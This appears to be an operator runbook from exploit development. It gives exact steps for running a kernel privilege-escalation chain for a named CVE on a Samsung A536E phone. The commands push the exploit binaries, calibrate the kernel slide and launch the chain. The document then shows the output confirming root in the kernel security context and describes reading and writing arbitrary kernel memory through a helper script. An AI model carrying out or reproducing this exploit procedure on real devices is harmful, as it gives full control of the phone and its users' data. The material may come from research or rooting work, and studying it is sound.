# A536 kernel-memory oracle: exact runbook (2026-08-07)

This is the exact procedure that finally let us read arbitrary kernel pages
on the A536E (including the "unreadable" reclaimed/SKB pages that earlier
returned `gate=-1`/`ERANGE`/`EIO` from the configfs read path).

## Why reads used to fail

The bridge's `kernel_read` goes through the ashmem/configfs trick. On
reclaimed KS pages the PTE-walk gate (`shadow_is_mapped`) returned `-1`
inside `chain-ks-auto`, and raw reads could `strnlen`-fault on unmapped
memory. The serve oracle avoids this by reading through the SAME bridge but
in the perf path (`chain-auto`), which uses a real, PTE-mapped user page and
keeps the fops/ARW session alive after `ROOT_OK`. With `A536_SHADOW_DIR`
set, the post-`ROOT_OK` fops process serves read/write/mapped requests from
`/data/local/tmp/clean-oracle/request` -> `response`.

Verified: serve reads SLUB pages (freed mm slabs), the perf page, `uid_lock`,
`init_task`, and arbitrary low/high physmap addresses, and returns different
bytes for different addresses. The pages that looked "protected" earlier are
readable through this live ARW session.

## Exact steps

1. Reboot once (one chain per boot). Wait only for:
   `getprop sys.boot_completed` = 1, `getprop init.svc.bootanim` = stopped.
   Do NOT wait for user unlock; ~1-2 min settle is enough.

2. Ensure no stale exploit processes and no KernelSU:
   `pgrep -f 'rb3|qroutehold2|page-leak'` -> empty
   `grep -c kernelsu /proc/modules` -> 0

3. Push current clean binaries under unique names:
   - `exploit/out/cve-2026-43499-bridge` -> `/data/local/tmp/a536-oracle-bridge`
   - `exploit/out/cve-2026-43499-write` -> `/data/local/tmp/a536-oracle-q0`
   - `exploit/out/page-leak-probe` -> `/data/local/tmp/a536-oracle-probe`
   - `exploit/out/cve-2026-43499-root` -> `/data/local/tmp/rmg-root`

   Run `chmod 755`, then `sync`, then compare device `sha256sum` with host
   SHA-256. Do not reuse generic names after a panic: unsynced F2FS writes can
   roll back and expose an older binary under the same name.

4. Read and verify the current slide without running GhostLock:
   ```
   A536_SLIDE_CALIBRATE_TRACEFS=1 \
     /data/local/tmp/a536-oracle-bridge slide-auto \
     /data/local/tmp/a536-oracle-q0
   ```

   Require `SLIDE_CALIBRATION ... result=match`. Use the printed slide in the
   next command.

5. Launch the perf-path chain with the shadow dir in the foreground:
   ```
   A536_SHADOW_DIR=/data/local/tmp/clean-oracle \
   A536_ORACLE_DETACH=1 \
     /data/local/tmp/a536-oracle-bridge chain 0xSLIDE \
     /data/local/tmp/a536-oracle-q0
   ```

   Read its output directly. Do not wrap this in a background shell plus a
   sleep/poll loop.

6. Wait until the command shows:
   ```
   ARW_OK
   ROOT_OK
   chain ready slide=... selinux_pid_live=1 fops_pid=... q0_fd=... patch_fd=...
   ```
   (`shadow arw ready dir=...` may appear before `ROOT_OK`.)

7. Verify root from a second terminal:
   `adb shell "/data/local/tmp/rmg-root -c id"` -> `uid=0 ... u:r:kernel:s0`

8. Read memory with `scripts/shadow-arw.ps1`:
   ```
   powershell -File scripts/shadow-arw.ps1 -Serial <adb-serial> \
     -Operation read -Address 0xffffff893b678000 -Length 32
   ```
   Other ops: `write`, `mapped`, `windows`, `quit`.

   IMPORTANT: issue reads ONE AT A TIME. Parallel invocations race on
   `request.tmp` and make serve answer `ERR request` or stale bytes.

## Gotchas

- Use the q0 binary built from the same clean checkout as the bridge. Check its
  hash on-device before launch.
- Do not run a second chain on the same boot unless the first reached
  `ROOT_OK` and the phone is stable; the GhostLock trigger leaves rt_mutex
  state that can panic a later chain.
- After `ROOT_OK`, only `rmg-root -c ...`, serve reads, and standalone
  `page-leak-probe` runs are safe on the same boot.
- `sync` the log files periodically; an unclean panic can roll back fresh
  `/data/local/tmp` writes on f2fs.
- A discarded order-3 slab can be split. Seeing the SKB payload at the target
  base does not prove that `base+0x1000` and later pages are owned by the same
  SKB allocation. Keep all rootless q0 fake locks and fops data inside the
  first verified 4-KiB page.
